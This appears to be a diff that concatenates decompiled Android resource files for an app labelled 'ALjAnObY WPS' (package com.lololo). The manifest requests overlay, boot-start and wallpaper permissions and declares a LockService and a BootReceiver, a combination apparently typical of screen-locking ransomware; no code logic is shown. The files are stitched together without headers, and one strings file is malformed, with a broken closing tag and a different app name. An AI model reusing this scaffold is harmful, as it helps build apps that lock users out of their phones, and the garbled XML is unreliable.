@@ -15,3 +15,43 @@
 		</LinearLayout>
 	</ScrollView>
 </LinearLayout>
+<?xml version="1.0" encoding="utf-8" ?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="1.0" package="com.lololo" platformBuildVersionCode="23" platformBuildVersionName="6.0-2704002">
+	<uses-sdk android:minSdkVersion="8" android:targetSdkVersion="21" />
+	<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+	<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+	<uses-permission android:name="android.permission.SET_WALLPAPER" />
+	<application android:icon="@drawable/ic_launcher" android:label="ALjAnObY WPS">
+		<activity android:label="ALjAnObY WPS" android:name="com.lololo.MainActivity">
+			<intent-filter>
+				<action android:name="android.intent.action.MAIN" />
+				<category android:name="android.intent.category.LAUNCHER" />
+			</intent-filter>
+		</activity>
+		<service android:enabled="true" android:name="com.lololo.LockService" />
+		<receiver android:enabled="true" android:name="com.lololo.BootReceiver" android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
+			<intent-filter>
+				<action android:name="android.intent.action.BOOT_COMPLETED" />
+				<category android:name="android.intent.category.DEFAULT" />
+			</intent-filter>
+		</receiver>
+	</application>
+</manifest>
+<? xml version = "1.0" encoding = "utf-8"?> <resources> <string name = "hello"> start </string> <string name = "app_name"> Al Shaibani SMS </string> </resring>
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+<public type="drawable" name="image_1" id="0x7f020001" />
+<public type="drawable" name="ic_launcher" id="0x7f020000" />
+<public type="layout" name="main" id="0x7f030000" />
+<public type="string" name="hello" id="0x7f040000" />
+<public type="string" name="app_name" id="0x7f040001" />
+<public type="id" name="mainEditText1" id="0x7f050000" />
+<public type="id" name="mainButton1" id="0x7f050001" />
+<public type="id" name="mainCheckBox1" id="0x7f050002" />
+</resources>
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+<item type="id" name="mainEditText1">false</item>
+<item type="id" name="mainButton1">false</item>
+<item type="id" name="mainCheckBox1">false</item>
+</resources>
